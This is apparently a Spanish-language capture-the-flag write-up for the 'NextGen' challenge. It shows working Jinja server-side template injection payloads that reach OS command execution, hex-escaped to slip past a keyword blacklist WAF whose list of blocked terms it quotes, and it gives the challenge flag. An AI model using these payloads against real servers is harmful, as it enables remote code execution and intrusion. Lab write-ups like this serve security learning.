# NextGen - N3XT_L3V3L
> Dominio dado: https://fxc99.ctf.n3xtl3v3l.site/

## Solucion
Al momento de entrar al sitio web podemos ver un input que nos solicita ingresar nuestro nombre o un payload, ingresare mi nickname: **Vishok** para ver su respuesta

![[Pasted image 20250826193027.png]]

Si un input se ve reflejado en alguna parte de la web, puede significar claramente que en el servidor este corriendo una *template*, lo cual nos da un indicio de que posiblemente es vulnerable a *SSTI*, para verificar, usaremos algunos payloads SSTI

El que encaje a la perfeccion es: `{{7*7}}`, este payload equivale a plantillas *Jinja* o *Twig*, si hay un SSTI podemos ejecutar comandos en el servidor y asi obtener la flag mediante comandos. Ahora probaremos un payload mas complejo:

```
`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
```

Estamos intentando ejecutar el comando `id`, pero el servidor nos responde con lo siguiente:

> WAF BLOCKED: Malicious keyword found.

Existe un *WAF* implementado, el cual captura probablemente algunas palabras que lleven a una ejecucion decomandos como el `os`, `import`, entre otras, revisando la web con las herramientas de desarrollo encontramos lo siguiente:

```
const WAF_BLACKLIST = [
    'config', 'self', 'class',
    'os', 'import', 'eval', 'exec', 'popen', 'system', 'subprocess',
    'read', 'write', 'open', 'builtins', 
]
```

Dentro del Js de la web nos dejaron una pista, todas las palabras que el WAF detecta en nuestras request, dado que no podemos usar `join`, o **concatenacion**, debemos buscar otra forma, que que estos metodos no son las funciones como tal, son solo **strings**, los cuales no sirven
- `{{''.join(['s','e','l','f'])}}
- `{{''.join(['o','s'])}}`

Nuestra mejor opcion es buscar alguna forma de bypasear el WAF usando codificacion *url*, *base64* o *hexadecimal*, en el proceso encontre esta web: https://www.thehacker.recipes/web/inputs/ssti. Donde se usa codificacion hexadecimal

```
# \x5f is equal to _
{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}

# This payload is the same than the previous one
{{ request['\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']('\x69\x64')['\x72\x65\x61\x64']() }}
```

Por tanto

![[Pasted image 20250826195619.png]]

Usando este payload podemos ejecutar comandos en el servidor, pero primero debemos encontrar donde esta la flag para despues leer su contenido, por lo que ocupamos codificar a hexadecimal los comandos `ls` y `cat flag.txt`
- `6c 73` = `ls` 
- `0a 63 61 74 20 66 6c 61 67 2e 74 78 74` = `cat flag.txt`

Primero buscaremos donde esta la flag

![[Pasted image 20250826200052.png]]

Lo unico que debemos hacer es sustituir el payload por el nuevo y listo, la flag esta en la misma ruta que estamos, asi que solo debemos usar el comando anterior sin modificaciones
- `echo '63 61 74 20 66 6c 61 67 2e 74 78 74' | sed -e 's/ /\\x/g'`

![[Pasted image 20250826200626.png]]

> La flag es: `n3xt{sst1_m4k3_4_p3rf3ct_ch4ll3ng3}`

